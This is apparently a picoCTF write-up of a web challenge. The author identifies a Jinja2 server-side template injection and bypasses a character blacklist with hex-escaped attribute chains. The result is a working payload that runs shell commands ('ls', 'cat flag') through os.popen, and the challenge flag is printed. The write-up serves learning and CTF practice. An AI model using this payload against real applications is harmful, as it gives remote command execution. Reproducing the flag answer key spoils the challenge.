# Challenge: dont-use-client-side
- Category: Web

## Description
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)
Additional details will be available after launching your challenge instance.
## Files and Setup
`http://shape-facility.picoctf.net:56693/`

## Flag: 
`picoCTF{sst1_f1lt3r_byp4ss_6787c4d8}`

## Solution
Opening the website i saw 

<img width="658" height="259" alt="image" src="https://github.com/user-attachments/assets/d177824b-7cb2-47ce-9b93-cd79f81666e8" />

The values, i enter in this would just be announced back to me.

So looking at the name SSTI, which suggest Server Side Template Injection, i entered `{{5*5}}`. This returned `25`, which confirmed that this website used ssti.

Searching online for SSTI exploits, i found an article on portswigger, which led me to the decision tree that showed

<img width="640" height="386" alt="image" src="https://github.com/user-attachments/assets/10cf3fb2-a926-48a8-b003-1aaa7dfe7384" /> 

and i also found this `For example, the payload {{7*'7'}} returns 49 in Twig and 7777777 in Jinja2.`, so i decided to check for Jinja2, and it matched.

After multiple failed attempts i figured out that `. | _ []` are blacklisted

After reading up on how to bypass these filters, i was able to get 
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}`

which returned 

<img width="1363" height="501" alt="image" src="https://github.com/user-attachments/assets/918dc51a-1842-4d93-9843-0eae76e2ddd4" />

finally the payload which got me the flag was 
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}`

<img width="1794" height="347" alt="image" src="https://github.com/user-attachments/assets/52ff0a04-4cc3-4494-82ee-285bce95be3a" />

## References
- https://portswigger.net/web-security/server-side-template-injection
- http://onsecurity.io/blog/server-side-template-injection-with-jinja2/
- https://techbrunch.github.io/patt-mkdocs/Server%20Side%20Template%20Injection/#jinja2-filter-bypass
